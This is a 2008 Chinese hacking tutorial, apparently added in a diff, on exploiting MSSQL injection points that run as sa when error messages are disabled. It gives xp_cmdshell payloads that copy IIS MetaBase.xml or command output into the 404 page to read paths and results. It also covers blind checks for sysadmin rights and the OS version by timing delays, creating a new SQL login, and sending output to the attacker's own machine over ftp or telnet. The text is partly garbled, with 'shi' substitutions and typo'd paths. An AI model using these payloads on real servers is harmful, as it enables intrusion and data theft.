@@ -1,0 +1,58 @@
+遇到一个sa注入点，mssql错误提示关闭无疑shi让人郁闷的事情。
+
+　　虽然错误提示关闭也shi可能以列目录，执行命令，但shishi多少就有些不方便。阿D就可能以在错误提示关闭的情况下列目录。
+
+　　这里有一个很好的方法，让你得到web目录路径，让你得到服务器上的文件，让你执行命令得到回显。
+
+　　IIS，404页面的默认路径shi C:\Windows\Help\iisHelp\common\404b.htm
+
+　　得到web路径exec master..xp_cmdshell ’copy C:\Windows\system32\inetsrv\MetaBase.xml C:\Windows\Help\iisHelp\common\404b.htm’--
+
+　　,这shi20003，如果是2000的话，exec master..xp_cmdshell ’copy C:\Winnt\system32 \inetsrv\MetaBase.xml C:\Winnts\Help\iisHelp\common\404b.htm’--，在 MetaBase.xml存着IIS的很多信息。执行上面的语句之后，你再访问一下网站一个不存在的文件或目录，显示的就shiMetaBase.xml 的内容了。
+
+　　执行命令得到回显
+
+　　通过上面得到web路径的方法，你肯定很容易想到怎么得到回显了吧。 2003，exec master..xp_cmdshell ’ver >C:\Windows\Help\iisHelp\common \404b.htm’--如果是2000，exec master..xp_cmdshell ’ver >C:\Winnt\Help \iisHelp\common\404b.htm’--
+
+　　得到文件也shi相同，把文件copy到404b.htm就行了
+
+　　by 28ice, 2008/6/26
+
+　　摘自 28度的冰
+
+　　盲注判断权限和操作系统版本
+
+　　首先第一个问题，如果错误提示关闭，怎么判断当前的权限shi否为sysadmin呢?
+
+　　最简单的，可能以用这样的方法：
+
+　　1=(select IS_SRVROLEMEMBER(’sysadmin’))
+
+　　当然，有些情况下，这个方法并不奏效。
+
+　　既然是sa，我们就可能以通过执行命令判断，不过，既然错误提示关闭，那么执行的结果就很不容易拿到。
+
+　　有个3办法可能以解决这个问题
+
+　　a.把执行结果写到404b.htm，具体请看我的上一篇文章
+
+　　b.执行ping 127.1 -n 10，看看页面shi否延迟10秒钟
+
+　　c.如果1433端口可能以连接，那干脆新建个sql登录
+
+　　d.如果大牛你是公网Ip,openrowset，或者直接telnet，ftp到你自己的机子，说到这里，ftp还有别的用处，比如，把执行结果写到文件中，然后通过ftp传到你的机子上，这何尝不shi获得执行结果的一个好办法。当然，你可能能要用到ftp的-s参数
+
+　　还有一个问题，怎么判断系统是2000还是2003?当然指的是错误提示关闭的情况下
+
+　　很简单
+
+　　执行systeminfo
+
+　　在xp/2003下才有这个命令，这个命令执行大概需要5秒钟时间。如果页面延迟5秒，就可能以进一步断定这shi2003(当然不排除2008的可能能性)。 
+
+
+
+
+
+
+
